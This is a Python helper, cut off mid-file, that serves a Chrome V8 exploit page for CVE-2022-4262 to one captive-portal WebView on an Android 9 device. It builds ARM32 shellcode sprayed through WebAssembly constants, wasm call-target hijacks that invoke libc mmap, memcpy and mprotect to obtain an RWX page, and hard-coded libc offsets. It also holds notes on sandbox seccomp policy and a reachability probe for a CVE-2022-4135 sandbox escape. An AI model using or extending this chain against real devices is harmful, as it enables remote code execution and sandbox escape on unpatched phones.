#!/usr/bin/env python3
"""Serve a bounded CVE-2022-4262 candidate or pressure-only calibration.

By default, the page is derived from one pinned public d8 proof of concept. It
replaces d8 debug intrinsics with no-op expressions that retain their argument
evaluation, replaces the repeated 2 GiB ArrayBuffer request with at most six
transient 16 MiB allocations, and reports bounded booleans for an object
address/recovery round trip, the PoC's 0x30 array-length trigger marker,
successful pressure-allocation bytes, and exposed heap counters. If the trigger
marker is absent, the page stops before address or object-recovery operations.
The allocation counters do not measure or confirm garbage collections.

With --calibration-only, the helper serves a separate bounded allocation page
without fetching or loading the CVE proof of concept. It checks whether a
WeakRef target was cleared and records a FinalizationRegistry callback as a
secondary signal. With --single-original-gc-allocation, it instead attempts
one original-size ArrayBuffer allocation, without touching its pages. With
--original-gc-sequence-calibration, it repeats caught failures up to six times
and stops after the first successful allocation. With --original-gc-trigger,
the pinned PoC runs using the original-size allocation request, capped to six
attempts and at most one successful allocation. Large allocation requests
can terminate the WebView or reboot the device. No observed collection does
not prove that GC did not occur. The PoC page stops before any native stage
and never returns raw addresses. With --probe-arraybuffer-pointer-model, it
also performs a bounded read-only scan of a self-created ArrayBuffer and reports
only a 32/64-bit layout hint. With --probe-layout, it also performs a read-only
leak of a JSFunction's and a Wasm exported function's code-pointer field (offset
0x18), reporting only pointer/map validity booleans and a region-relationship
flag. Every page is served once and only to the captured
Portal Android 9 Chrome 106 CaptivePortalLogin request.

This remains an unverified browser port: V8 build and WebView process ABI are
not exposed by the compatibility report. A failed attempt may terminate the
CaptivePortalLogin WebView. When started with sudo to bind port 80, this helper
drops to the invoking user before fetching the pinned source or serving it.
"""

import argparse
import hashlib
import http.server
import ipaddress
import json
import re
import socketserver
import struct
import threading
import urllib.parse
import urllib.request

from portal_probe_runtime import drop_privileges_after_bind


SOURCE_URL = (
    "https://raw.githubusercontent.com/mistymntncop/CVE-2022-4262/"
    "f35992269257ef5302d314739608e5cf900b2a19/exploit.js"
)
SOURCE_GIT_BLOB_SHA1 = "1f449ccb6be5b8f69b0c26a051b5ce80bde278a6"
MAX_SOURCE_BYTES = 128 * 1024
MAX_REPORT_BYTES = 4096


def _words_to_double(lo, hi):
    return struct.unpack("<d", struct.pack("<II", lo & 0xFFFFFFFF, hi & 0xFFFFFFFF))[0]


# ARM32 shellcode words: push{r4-r11,lr}; mov r7,#20; svc #0; mov r0,r0,lsl#1; pop{r4-r11,pc}; NOP
SPRAY_D0_LITERAL = repr(_words_to_double(0xE92D4FF0, 0xE3A07014))
SPRAY_D1_LITERAL = repr(_words_to_double(0xEF000000, 0xE1A00080))
SPRAY_D2_LITERAL = repr(_words_to_double(0xE8BD8FF0, 0xE1A00000))


def _double_little_endian(value):
    return struct.pack("<d", value)


def _build_wasm_spray_module():
    """A minimal wasm module exporting f() -> f64 that materializes the three
    shellcode-encoding doubles via f64.const so Liftoff emits them into the
    code constant pool (compiles synchronously; no TurboFan/timing dependency).
    """
    d0 = _words_to_double(0xE92D4FF0, 0xE3A07014)
    d1 = _words_to_double(0xEF000000, 0xE1A00080)
    d2 = _words_to_double(0xE8BD8FF0, 0xE1A00000)
    body = (
        b"\x00"
        + b"\x44" + _double_little_endian(d0)
        + b"\x44" + _double_little_endian(d1)
        + b"\x44" + _double_little_endian(d2)
        + b"\xa0\xa0"
        + b"\x0b"
    )
    code_contents = b"\x01" + bytes([len(body)]) + body
    code_section = b"\x0a" + bytes([len(code_contents)]) + code_contents
    return (
        b"\x00\x61\x73\x6d\x01\x00\x00\x00"
        b"\x01\x05\x01\x60\x00\x01\x7c"
        b"\x03\x02\x01\x00"
        b"\x07\x05\x01\x01\x66\x00\x00"
        + code_section
    )


WASM_SPRAY_BYTES = _build_wasm_spray_module()
WASM_SPRAY_BYTES_JS = "[" + ",".join(str(b) for b in WASM_SPRAY_BYTES) + "]"

# A minimal wasm module exporting g() -> i32 returning 42. Its WasmInternalFunction
# call_target is overwritten with the getpid entry for the deterministic jump; the
# JS-to-wasm wrapper then converts the i32 return (pid) to a clean JS number.
WASM_I32_MODULE_BYTES = bytes([
    0x00, 0x61, 0x73, 0x6D, 0x01, 0x00, 0x00, 0x00,  # magic + version
    0x01, 0x05, 0x01, 0x60, 0x00, 0x01, 0x7F,        # type: () -> i32
    0x03, 0x02, 0x01, 0x00,                           # func section
    0x07, 0x05, 0x01, 0x01, 0x67, 0x00, 0x00,        # export "g"
    0x0A, 0x06, 0x01, 0x04, 0x00, 0x41, 0x2A, 0x0B,  # code: i32.const 42
])
WASM_I32_MODULE_BYTES_JS = "[" + ",".join(str(b) for b in WASM_I32_MODULE_BYTES) + "]"


def _leb128(value):
    out = bytearray()
    while True:
        b = value & 0x7F
        value >>= 7
        if value:
            out.append(b | 0x80)
        else:
            out.append(b)
            break
    return bytes(out)


def _build_wasm_multi8_module(n=16):
    """Wasm module exporting n functions f0..f(n-1), each (i32 x 9) -> i32.

    The 9-param signature covers the widest CVE-2022-4135 trigger call
    (SharedImageInterface::CreateSharedImage = this + sret + 7 visible args;
    ARM AAPCS passes `this` in r0 and the sret pointer in r1, then r2/r3,
    then the remaining 5 args on the stack). Each exported function is used at
    most once as a native-call trampoline (its call_target is overwritten then
    restored), because the env-probe crash history showed that reusing one
    function's call_target more than once is what corrupts the renderer. Body
    is i32.const 0; the body never runs since call_target is redirected.
    """
    type_content = b"\x01\x60\x09" + b"\x7f" * 9 + b"\x01\x7f"
    type_section = b"\x01" + _leb128(len(type_content)) + type_content

    func_content = _leb128(n) + b"\x00" * n
    func_section = b"\x03" + _leb128(len(func_content)) + func_content

    exports = bytearray()
    for i in range(n):
        name = b"f" + str(i).encode("ascii")
        exports += _leb128(len(name)) + name + b"\x00" + _leb128(i)
    export_content = _leb128(n) + bytes(exports)
    export_section = b"\x07" + _leb128(len(export_content)) + export_content

    body = b"\x00\x41\x00\x0b"  # 0 locals, i32.const 0, end
    code_content = _leb128(n)
    for _ in range(n):
        code_content += _leb128(len(body)) + body
    code_section = b"\x0a" + _leb128(len(code_content)) + code_content

    return (
        b"\x00\x61\x73\x6d\x01\x00\x00\x00"
        + type_section
        + func_section
        + export_section
        + code_section
    )


WASM_MULTI8_MODULE_BYTES = _build_wasm_multi8_module(16)
WASM_MULTI8_MODULE_BYTES_JS = "[" + ",".join(str(b) for b in WASM_MULTI8_MODULE_BYTES) + "]"


# ARM32 9-arg vtable-call trampoline. Entered with r0 = &descriptor, where the
# descriptor is [entry][arg0..arg8] (10 words). It loads r0-r3 from args 0-3,
# pushes args 4-8 onto the machine stack in reverse order, blx's to the (Thumb)
# vtable entry, then unwinds the stack. This bypasses V8's js-to-wasm wrapper,
# which only marshals r0-r3 correctly for <=4-param signatures; the 9-param
# generic wrapper leaves r1-r3 garbage (confirmed on-device: GenFramebuffers
# probe wrote nothing, fb=0).
TRAMP_WORDS = [
    0xE92D4FF0,  # push {r4-r11, lr}
    0xE1A04000,  # mov r4, r0
    0xE594C000,  # ldr r12, [r4, #0]   ; entry
    0xE5940004,  # ldr r0,  [r4, #4]   ; arg0
    0xE5941008,  # ldr r1,  [r4, #8]   ; arg1
    0xE594200C,  # ldr r2,  [r4, #12]  ; arg2
    0xE5943010,  # ldr r3,  [r4, #16]  ; arg3
    0xE5945024,  # ldr r5,  [r4, #36]  ; arg8
    0xE92D0020,  # push {r5}
    0xE5945020,  # ldr r5,  [r4, #32]  ; arg7
    0xE92D0020,  # push {r5}
    0xE594501C,  # ldr r5,  [r4, #28]  ; arg6
    0xE92D0020,  # push {r5}
    0xE5945018,  # ldr r5,  [r4, #24]  ; arg5
    0xE92D0020,  # push {r5}
    0xE5945014,  # ldr r5,  [r4, #20]  ; arg4
    0xE92D0020,  # push {r5}
    0xE12FFF3C,  # blx r12
    0xE28DD014,  # add sp, sp, #20
    0xE8BD8FF0,  # pop {r4-r11, pc}
]
TRAMP_WORDS_JS = "[" + ",".join(str(w) + "n" for w in TRAMP_WORDS) + "]"


def _build_wasm_multi1_module(n=16):
    """Wasm module exporting n functions f0..f(n-1), each (i32) -> i32.

    Used as fresh native-call trampolines for the 1-arg call_target redirect:
    JS calls fn(descriptor) -> the fast js-to-wasm wrapper places descriptor in
    r0 -> call_target (redirected to the ARM trampoline). Each function is used
    once (reusing a call_target crashes the renderer).
    """
    type_content = b"\x01\x60\x01\x7f\x01\x7f"
    type_section = b"\x01" + _leb128(len(type_content)) + type_content

    func_content = _leb128(n) + b"\x00" * n
    func_section = b"\x03" + _leb128(len(func_content)) + func_content

    exports = bytearray()
    for i in range(n):
        name = b"f" + str(i).encode("ascii")
        exports += _leb128(len(name)) + name + b"\x00" + _leb128(i)
    export_content = _leb128(n) + bytes(exports)
    export_section = b"\x07" + _leb128(len(export_content)) + export_content

    body = b"\x00\x20\x00\x0b"  # 0 locals, local.get 0, end
    code_content = _leb128(n)
    for _ in range(n):
        code_content += _leb128(len(body)) + body
    code_section = b"\x0a" + _leb128(len(code_content)) + code_content

    return (
        b"\x00\x61\x73\x6d\x01\x00\x00\x00"
        + type_section
        + func_section
        + export_section
        + code_section
    )


WASM_MULTI1_MODULE_BYTES = _build_wasm_multi1_module(16)
WASM_MULTI1_MODULE_BYTES_JS = "[" + ",".join(str(b) for b in WASM_MULTI1_MODULE_BYTES) + "]"


def _build_wasm_i32x3_module():
    """Wasm module m(i32, i32, i32) -> i32 used to call libc mprotect(addr, len,
    prot) through a call_target hijack. 3 params <= 4 => the js-to-wasm wrapper
    fast path marshals r0-r2 correctly (no trampoline needed)."""
    return (
        b"\x00\x61\x73\x6d\x01\x00\x00\x00"
        b"\x01\x08\x01\x60\x03\x7f\x7f\x7f\x01\x7f"  # type: (i32,i32,i32)->i32
        b"\x03\x02\x01\x00"
        b"\x07\x05\x01\x01\x6d\x00\x00"              # export "m"
        b"\x0a\x06\x01\x04\x00\x41\x00\x0b"          # code: i32.const 0
    )


WASM_I32X3_MODULE_BYTES = _build_wasm_i32x3_module()
WASM_I32X3_MODULE_BYTES_JS = "[" + ",".join(str(b) for b in WASM_I32X3_MODULE_BYTES) + "]"


def _build_wasm_i32x4_module():
    """Wasm module mm(i32, i32, i32, i32) -> i32 used to call libc mmap(addr, len,
    prot, flags) through a call_target hijack. 4 params <= 4 => the js-to-wasm
    wrapper fast path marshals r0-r3 correctly. With MAP_PRIVATE|MAP_ANONYMOUS
    the fd/offset stack slots are ignored by the kernel, so this is enough to
    request a fresh RWX page (prot=7)."""
    return (
        b"\x00\x61\x73\x6d\x01\x00\x00\x00"
        b"\x01\x09\x01\x60\x04\x7f\x7f\x7f\x7f\x01\x7f"  # type: (i32,i32,i32,i32)->i32
        b"\x03\x02\x01\x00"
        b"\x07\x06\x01\x02\x6d\x6d\x00\x00"              # export "mm"
        b"\x0a\x06\x01\x04\x00\x41\x00\x0b"              # code: i32.const 0
    )


WASM_I32X4_MODULE_BYTES = _build_wasm_i32x4_module()
WASM_I32X4_MODULE_BYTES_JS = "[" + ",".join(str(b) for b in WASM_I32X4_MODULE_BYTES) + "]"


def _build_wasm_dispatch_module():
    """Wasm module used to drive a call_indirect through a hijacked function
    table target. Exports:
      - B (type 0: (i32,i32,i32,i32)->i32) = the table entry (body i32.const 0).
      - A (type 1: (i32)->i32): loads 4 i32 args from linear memory at
        [desc+0/+4/+8/+12] and does `call_indirect (type 0) (i32.const 0)`.
      - mem: 1-page linear memory (JS writes the descriptor into it).
    The wasm->wasm call marshals r0-r3 via V8's own ABI (correct), so hijacking
    the table's targets[0] to a native fn gives correct AAPCS register args —
    the workaround for the broken js->wasm >1-arg marshaling."""
    type_content = (b"\x02"
        + b"\x60\x04\x7f\x7f\x7f\x7f\x01\x7f"  # type 0: (i32,i32,i32,i32)->i32
        + b"\x60\x01\x7f\x01\x7f")              # type 1: (i32)->i32
    type_section = b"\x01" + _leb128(len(type_content)) + type_content
    func_section = b"\x03" + _leb128(3) + b"\x02\x00\x01"  # B=type0, A=type1
    table_content = b"\x01" + b"\x70\x01\x01\x01"           # 1 table, funcref, 1..1
    table_section = b"\x04" + _leb128(len(table_content)) + table_content
    mem_content = b"\x01" + b"\x00\x01"                     # 1 memory, min 1 page
    mem_section = b"\x05" + _leb128(len(mem_content)) + mem_content
    export_content = (b"\x03"
        + b"\x01\x41\x00\x01"          # "A" -> func 1
        + b"\x01\x42\x00\x00"          # "B" -> func 0
        + b"\x03\x6d\x65\x6d\x02\x00")  # "mem" -> memory 0
    export_section = b"\x07" + _leb128(len(export_content)) + export_content
    elem_content = b"\x01" + b"\x00" + b"\x41\x00\x0b" + b"\x01\x00"  # table0[0]=func0
    elem_section = b"\x09" + _leb128(len(elem_content)) + elem_content
    body_b = b"\x00\x41\x00\x0b"  # 0 locals, i32.const 0, end
    body_a = (b"\x00"
        + b"\x20\x00" + b"\x28\x02\x00"   # addr (desc+0)
        + b"\x20\x00" + b"\x28\x02\x04"   # len  (desc+4)
        + b"\x20\x00" + b"\x28\x02\x08"   # prot (desc+8)
        + b"\x20\x00" + b"\x28\x02\x0c"   # flags(desc+12)
        + b"\x41\x00"                      # i32.const 0 (table index)
        + b"\x11\x00\x00"                  # call_indirect type0 table0
        + b"\x0b")
    code_content = (b"\x02"
        + _leb128(len(body_b)) + body_b
        + _leb128(len(body_a)) + body_a)
    code_section = b"\x0a" + _leb128(len(code_content)) + code_content
    return (b"\x00\x61\x73\x6d\x01\x00\x00\x00"
        + type_section + func_section + table_section + mem_section
        + export_section + elem_section + code_section)


WASM_DISPATCH_MODULE_BYTES = _build_wasm_dispatch_module()
WASM_DISPATCH_MODULE_BYTES_JS = (
    "[" + ",".join(str(b) for b in WASM_DISPATCH_MODULE_BYTES) + "]"
)


def _build_wasm_dispatch_i64_module():
    """6-argument dispatcher. A(desc) loads 6 i32 words from the descriptor and
    call_indirects through table0[0] (which we hijack to a libc pointer).

    Register reality on ARM32 Liftoff (verified against V8 10.6.194 source):
      * kGpParamRegisters = {r3, r0, r2, r6}; the instance sits in r3, so the
        real args marshal arg0->r0, arg1->r2, arg2->r6, arg3->stack0,
        arg4->stack1, arg5->stack2. r1 and r3 are NOT param registers.
      * i64 lowering (GetI32WasmCallDescriptor) splits an i64 into two i32 that
        grab {r0, r2}, so i64 params can NEVER reach r1 either.
      * The value that ends up in r1 at the blx is the cached memory-start
        register: the first dynamic-index load pins index(r0)+instance(r3),
        so GetMemoryStart() caches the wasm linear-memory base in r1 and the
        call marshaling never clobbers it. r1 == mem_start == a huge
        page-aligned heap pointer. This is exactly the observed EINVAL->ENOMEM
        flip (r1 went from a stale 0 to the huge mem_start once the i64.load
        was removed).
    r1==mem_start is usable: for a libc syscall() call we put the mmap2 LENGTH
    in r2 (arg1) and let r1 serve as a harmless (page-aligned) addr hint.
    Descriptor layout for syscall(192=mmap2, addr, len, prot, flags, fd, pgoff):
      [0]=arg0->r0=number(192)
      [1]=arg1->r2=a2=len
      [2]=arg2->r6 (unused by syscall)
      [3]=arg3->stack0=a4=flags
      [4]=arg4->stack1=a5=fd
      [5]=arg5->stack2=a6=pgoff
      ref->r3=a3=prot."""
    type_content = (b"\x02"
        + b"\x60\x06\x7f\x7f\x7f\x7f\x7f\x7f\x01\x7f"  # type 0: (i32×6)->i32
        + b"\x60\x01\x7f\x01\x7f")                      # type 1: (i32)->i32
    type_section = b"\x01" + _leb128(len(type_content)) + type_content
    func_section = b"\x03" + _leb128(3) + b"\x02\x00\x01"  # B=type0, A=type1
    table_content = b"\x01" + b"\x70\x01\x01\x01"
    table_section = b"\x04" + _leb128(len(table_content)) + table_content
    mem_content = b"\x01" + b"\x00\x01"
    mem_section = b"\x05" + _leb128(len(mem_content)) + mem_content
    export_content = (b"\x03"
        + b"\x01\x41\x00\x01"          # "A" -> func 1
        + b"\x01\x42\x00\x00"          # "B" -> func 0
        + b"\x03\x6d\x65\x6d\x02\x00")  # "mem" -> memory 0
    export_section = b"\x07" + _leb128(len(export_content)) + export_content
    elem_content = b"\x01" + b"\x00" + b"\x41\x00\x0b" + b"\x01\x00"
    elem_section = b"\x09" + _leb128(len(elem_content)) + elem_content
    body_b = b"\x00\x41\x00\x0b"      # B: i32.const 0 (ignores its 6 params)
    body_a = (b"\x00"
        + b"\x20\x00" + b"\x28\x02\x00"   # arg0 = i32.load(desc+0)
        + b"\x20\x00" + b"\x28\x02\x04"   # arg1 = i32.load(desc+4)
        + b"\x20\x00" + b"\x28\x02\x08"   # arg2 = i32.load(desc+8)
        + b"\x20\x00" + b"\x28\x02\x0c"   # arg3 = i32.load(desc+12)
        + b"\x20\x00" + b"\x28\x02\x10"   # arg4 = i32.load(desc+16)
        + b"\x20\x00" + b"\x28\x02\x14"   # arg5 = i32.load(desc+20)
        + b"\x41\x00"                      # i32.const 0 (table index)
        + b"\x11\x00\x00"                  # call_indirect type0 table0
        + b"\x0b")
    code_content = (b"\x02"
        + _leb128(len(body_b)) + body_b
        + _leb128(len(body_a)) + body_a)
    code_section = b"\x0a" + _leb128(len(code_content)) + code_content
    return (b"\x00\x61\x73\x6d\x01\x00\x00\x00"
        + type_section + func_section + table_section + mem_section
        + export_section + elem_section + code_section)


WASM_DISPATCH_I64_MODULE_BYTES = _build_wasm_dispatch_i64_module()
WASM_DISPATCH_I64_MODULE_BYTES_JS = (
    "[" + ",".join(str(b) for b in WASM_DISPATCH_I64_MODULE_BYTES) + "]"
)


def _build_wasm_direct_test_module():
    """Exports B(x)=x (idx 0) and A(x)=B(x) (idx 1, DIRECT local call). Used to
    test whether a wasm->wasm direct call jumps through the callee's call_target
    (which we hijack) or a compile-time-fixed code address."""
    type_content = b"\x01" + b"\x60\x01\x7f\x01\x7f"  # (i32)->i32
    type_section = b"\x01" + _leb128(len(type_content)) + type_content
    func_section = b"\x03" + _leb128(3) + b"\x02\x00\x00"  # 2 funcs, type 0
    export_content = (b"\x02"
        + b"\x01\x41\x00\x01"   # "A" -> func 1
        + b"\x01\x42\x00\x00")  # "B" -> func 0
    export_section = b"\x07" + _leb128(len(export_content)) + export_content
    body_b = b"\x00\x20\x00\x0b"          # local.get 0
    body_a = b"\x00\x20\x00\x10\x00\x0b"  # local.get 0; call 0
    code_content = (b"\x02"
        + _leb128(len(body_b)) + body_b
        + _leb128(len(body_a)) + body_a)
    code_section = b"\x0a" + _leb128(len(code_content)) + code_content
    return (b"\x00\x61\x73\x6d\x01\x00\x00\x00"
        + type_section + func_section + export_section + code_section)


WASM_DIRECT_TEST_MODULE_BYTES = _build_wasm_direct_test_module()
WASM_DIRECT_TEST_MODULE_BYTES_JS = (
    "[" + ",".join(str(b) for b in WASM_DIRECT_TEST_MODULE_BYTES) + "]"
)


def _build_wasm_import_test_module():
    """Imports B (env.B), exports A2(x)=B(x). Tests whether a CROSS-MODULE
    wasm->wasm call jumps through the imported B's call_target."""
    type_content = b"\x01" + b"\x60\x01\x7f\x01\x7f"
    type_section = b"\x01" + _leb128(len(type_content)) + type_content
    import_content = (b"\x01"
        + b"\x03\x65\x6e\x76"   # module "env"
        + b"\x01\x42"           # field "B"
        + b"\x00\x00")          # kind func, type 0
    import_section = b"\x02" + _leb128(len(import_content)) + import_content
    func_section = b"\x03" + _leb128(2) + b"\x01\x00"  # 1 defined func, type 0
    export_content = b"\x01" + b"\x02\x41\x32\x00\x00"  # "A2" -> func 0
    export_section = b"\x07" + _leb128(len(export_content)) + export_content
    body_a2 = b"\x00\x20\x00\x10\x00\x0b"  # local.get 0; call 0 (imported B)
    code_content = b"\x01" + _leb128(len(body_a2)) + body_a2
    code_section = b"\x0a" + _leb128(len(code_content)) + code_content
    return (b"\x00\x61\x73\x6d\x01\x00\x00\x00"
        + type_section + import_section + func_section + export_section + code_section)


WASM_IMPORT_TEST_MODULE_BYTES = _build_wasm_import_test_module()
WASM_IMPORT_TEST_MODULE_BYTES_JS = (
    "[" + ",".join(str(b) for b in WASM_IMPORT_TEST_MODULE_BYTES) + "]"
)


def _build_wasm_tramp_module():
    """Wasm module f(f64) -> f64 that materializes the 20 trampoline words via
    ten f64.const folded into a RUNTIME parameter (x + c0 + c1 + ... + c9). The
    parameter operand keeps every f64.add non-constant, so TurboFan cannot
    constant-fold the 10 constants into one (which is why the pure f() -> f64
    form left word_hits=0); Liftoff/TurboFan then keep each double contiguous in
    the code constant pool."""
    doubles = [
        _words_to_double(TRAMP_WORDS[i], TRAMP_WORDS[i + 1])
        for i in range(0, len(TRAMP_WORDS), 2)
    ]
    body = b"\x00\x20\x00"  # 0 locals, local.get 0 (runtime param)
    for d in doubles:
        body += b"\x44" + _double_little_endian(d) + b"\xa0"  # const + f64.add
    body += b"\x0b"
    code_contents = b"\x01" + _leb128(len(body)) + body
    code_section = b"\x0a" + _leb128(len(code_contents)) + code_contents
    return (
        b"\x00\x61\x73\x6d\x01\x00\x00\x00"
        b"\x01\x06\x01\x60\x01\x7c\x01\x7c"  # type: (f64) -> f64
        b"\x03\x02\x01\x00"
        b"\x07\x05\x01\x01\x66\x00\x00"      # export "f"
        + code_section
    )


WASM_TRAMP_MODULE_BYTES = _build_wasm_tramp_module()
WASM_TRAMP_MODULE_BYTES_JS = "[" + ",".join(str(b) for b in WASM_TRAMP_MODULE_BYTES) + "]"

# getpid - printf (both Thumb) from the device's own 32-bit bionic libc.so:
#   printf = 0x6d539, getpid = 0x1f6a5  =>  getpid = printf - 0x4de94.
GETPID_MINUS_PRINTF = 0x4DE94
# mprotect (ARM, 0x61738) from the same device libc.so dynsym:
#   printf - mprotect = 0x6d539 - 0x61738 = 0xbe01 (even => ARM mode).
MPROTECT_MINUS_PRINTF = 0xBE01
# mmap (Thumb, 0x29bc1) from the same device libc.so dynsym. Used to request a
# fresh RWX page (prot=7) without touching mprotect, which seccomp denies. With
# MAP_PRIVATE|MAP_ANONYMOUS (0x22) the fd/offset stack slots are ignored by the
# kernel, so a 4-param fast-path wasm call (r0-r3 only) drives it, no trampoline.
#   mmap = printf - 0x43978  (0x6d539 - 0x29bc1 = 0x43978; result odd => Thumb).
MMAP_MINUS_PRINTF = 0x43978
# memcpy (ARM, 0x19fe0) from the same device libc.so dynsym. Used to copy the
# 20-word trampoline out of the wasm linear memory (r1 == mem_start, the fixed
# call_indirect "src" register) into a fresh RWX mmap region (r0 == dest,
# r2 == n). This sidesteps both the v8_write64 high-address fault and the
# mprotect() crash.   memcpy = printf - 0x53559  (0x6d539 - 0x19fe0, even => ARM).
MEMCPY_MINUS_PRINTF = 0x53559

# Phase-5 env-probe offsets, each relative to the leaked printf (0x6d539, Thumb),
# from the same device libc.so dynsym (raw st_value, Thumb bit included):
#   getuid = 0x61440 (ARM), open = 0x242d5 (Thumb), read = 0x61940 (ARM),
#   close  = 0x1e115 (Thumb). The subtraction below carries the correct bit0
#   automatically (odd diff -> even/ARM, even diff -> odd/Thumb).
GETUID_MINUS_PRINTF = 0xC0F9
OPEN_MINUS_PRINTF = 0x49264
READ_MINUS_PRINTF = 0xBBF9
CLOSE_MINUS_PRINTF = 0x4F424
# uname (ARM, 0x62158) is a direct svc #122 leaf and is explicitly Allow()ed by
# the Chrome-106 renderer seccomp baseline policy (unlike open/openat, which fall
# to Error(EPERM)). __errno (Thumb, 0x1cf7f) returns &errno (TLS+8) with no
# syscall, used to capture the errno left by a denied open().
UNAME_MINUS_PRINTF = 0xB3E1
ERRNO_MINUS_PRINTF = 0x505BA
# abs (Thumb, 0x5fb75) is a pure leaf (cmp r0,#0; rsbmi r0,r0,#0; bx lr) with no
# syscall and no memory access — a crash-safe canary to discover which wasm
# parameter position lands in r0 (the register AAPCS functions read).
ABS_MINUS_PRINTF = 0xD9C4
# Phase-6 (Door A) fd/channel recon offsets, all relative to the leaked printf.
# getsockname/getpeername/fstat are ARM (even) and getppid/getresuid/sysinfo are
# ARM too; fcntl sits ABOVE printf (Thumb), hence the "+" constant. From the same
# device libc.so dynsym (raw st_value, Thumb bit included).
GETSOCKNAME_MINUS_PRINTF = 0xC141
GETPEERNAME_MINUS_PRINTF = 0xC261
FSTAT_MINUS_PRINTF = 0xC381
FCNTL_PLUS_PRINTF = 0x2CAC
GETPPID_MINUS_PRINTF = 0xC221
GETRESUID_MINUS_PRINTF = 0xC1C1
SYSINFO_MINUS_PRINTF = 0xB541
TARGET_UA_PARTS = (
    "Android 9",
    "Build/PKQ1.191202.001",
    "Chrome/106.0.5249.126",
    "; wv)",
)
TARGET_HOST = "connectivitycheck.gstatic.com"
TARGET_PATH = "/generate_204"
REPORT_PATH = "/api/report"
PRESSURE_CHUNK_BYTES = 16 * 1024 * 1024
MAX_PRESSURE_ALLOCATION_BYTES = 96 * 1024 * 1024
MAX_PRESSURE_ALLOCATION_CALLS = (
    MAX_PRESSURE_ALLOCATION_BYTES // PRESSURE_CHUNK_BYTES
)
ORIGINAL_GC_ALLOCATION_BYTES = 0x7FE00000

GC_MAJOR_RE = re.compile(
    r"function gc_major\(\) \{\s*//mark-sweep\s*"
    r"new ArrayBuffer\(0x7fe00000\);\s*\}",
    re.MULTILINE,
)
DEBUG_INTRINSIC_RE = re.compile(
    r"^\s*%(?:GlobalPrint|DebugPrint)\((.*)\);\s*$",
    re.MULTILINE,
)
COMMENTED_DEBUG_INTRINSIC_RE = re.compile(
    r"^\s*//\s*%(?:GlobalPrint|DebugPrint)\([^\r\n]*\);\s*$",
    re.MULTILINE,
)

CAPTIVE_HINT = b"""<!doctype html><meta charset=utf-8>
<title>Network sign-in required</title>
<p>Open the Portal sign-in prompt to continue.</p>
"""


def build_pressure_calibration_page(
    allocation_size=PRESSURE_CHUNK_BYTES,
    allocation_calls=MAX_PRESSURE_ALLOCATION_CALLS,
    touch_allocation=True,
    continue_on_failure=False,
    stop_after_success=False,
):
    """Build a pressure-only page that does not load the CVE proof of concept."""
    touch_code = """
      touched = new Uint8Array(pressure);
      touched[0] = 0x42;
      touched[touched.length - 1] = 0x62;
""" if touch_allocation else ""
    page = f"""<!doctype html>
<html lang="en"><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>Portal allocation calibration</title>
<p id="status">Running bounded allocation calibration...</p>
<script>
(async function() {{
  let allocationBytes = 0;
  let allocationCalls = 0;
  let allocationAttempts = 0;
  let allocationFailures = 0;
  let finalizationCallbacks = 0;
  let allocationFailed = false;
  let registry = null;
  let sentinelRef = null;
  let weakrefTargetCleared = false;
  const heapSnapshot = function() {{
    try {{
      const memory = performance && performance.memory;
      return memory ? {{
        used: Number.isFinite(memory.usedJSHeapSize) ? Math.floor(memory.usedJSHeapSize) : null,
        limit: Number.isFinite(memory.jsHeapSizeLimit) ? Math.floor(memory.jsHeapSizeLimit) : null
      }} : {{used: null, limit: null}};
    }} catch (_error) {{ return {{used: null, limit: null}}; }}
  }};
  const start = heapSnapshot();
  const finalizationSupported = typeof FinalizationRegistry === "function";
  const weakrefSupported = typeof WeakRef === "function";
  if (finalizationSupported) {{
    registry = new FinalizationRegistry(function() {{ finalizationCallbacks += 1; }});
    window.__portal_pressure_calibration_registry = registry;
  }}
  let sentinel = {{marker: "portal-pressure-calibration"}};
  if (weakrefSupported) sentinelRef = new WeakRef(sentinel);
  if (finalizationSupported) registry.register(sentinel, "sentinel");
  sentinel = null;
  const nextTurn = function(delay) {{ return new Promise(function(resolve) {{ setTimeout(resolve, delay); }}); }};
  for (let i = 0; i < {allocation_calls}; i += 1) {{
    let pressure = null;
    let touched = null;
    allocationAttempts += 1;
    try {{
      pressure = new ArrayBuffer({allocation_size});
{touch_code} 
      allocationBytes += pressure.byteLength;
      allocationCalls += 1;
    }} catch (_error) {{
      allocationFailures += 1;
      allocationFailed = true;
      if (!{str(continue_on_failure).lower()}) break;
    }} finally {{
      touched = null;
      pressure = null;
    }}
    if ({str(stop_after_success).lower()} && allocationCalls > 0) break;
  }}
  const deadline = performance.now() + 3000;
  while (performance.now() < deadline) {{
    if (weakrefSupported && !weakrefTargetCleared) {{
      weakrefTargetCleared = sentinelRef.deref() === undefined;
    }}
    if ((!weakrefSupported || weakrefTargetCleared) &&
        (!finalizationSupported || finalizationCallbacks > 0)) break;
    await nextTurn(100);
  }}
  const end = heapSnapshot();
  void registry;
  delete window.__portal_pressure_calibration_registry;
  const status = !weakrefSupported ? "unsupported" :
    allocationFailed && allocationCalls === 0 ? "allocation_failed" :
    weakrefTargetCleared ? "collection_observed" : "no_collection_observed";
  document.getElementById("status").textContent = status;
  const report = {{
    mode: "pressure_calibration",
    status,
    weakref_supported: weakrefSupported,
    weakref_target_cleared: weakrefTargetCleared,
    finalization_supported: finalizationSupported,
    finalization_signal: finalizationCallbacks > 0,
    finalization_callbacks: finalizationCallbacks,
    allocation_attempts: allocationAttempts,
    allocation_failures: allocationFailures,
    pressure_allocation_bytes: allocationBytes,
    pressure_allocation_calls: allocationCalls,
    heap_used_start_bytes: start.used,
    heap_used_bytes: end.used,
    heap_limit_bytes: end.limit
  }};
  fetch("/api/report", {{
    method: "POST",
    headers: {{"Content-Type": "application/json"}},
    cache: "no-store",
    credentials: "omit",
    body: JSON.stringify(report)
  }}).catch(function() {{}});
}})().catch(function() {{
  document.getElementById("status").textContent = "calibration_exception";
}});
</script></html>
"""
    return page.encode("utf-8")


def build_webgl_probe_page():
    """Build a standalone WebGL capability probe that does not load the CVE PoC.

    This answers the reachability preconditions for CVE-2022-4135 (the Chrome
    GPU validating-command-decoder heap overflow used as the renderer->browser
    escape in the TAG Nov-2022 Android chain): whether WebGL2 is available at
    all, whether the GL backend is native GLES (validating decoder) or ANGLE
    (passthrough decoder), and whether EXT_discard_framebuffer (needed by the
    trigger) is present. It performs no memory writes and reports only short
    capability strings/booleans.
    """
    page = """<!doctype html>
<html lang="en"><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>Portal WebGL probe</title>
<p id="status">Running WebGL capability probe...</p>
<script>
(function() {
  var report = {
    mode: "webgl_probe",
    webgl1_supported: false,
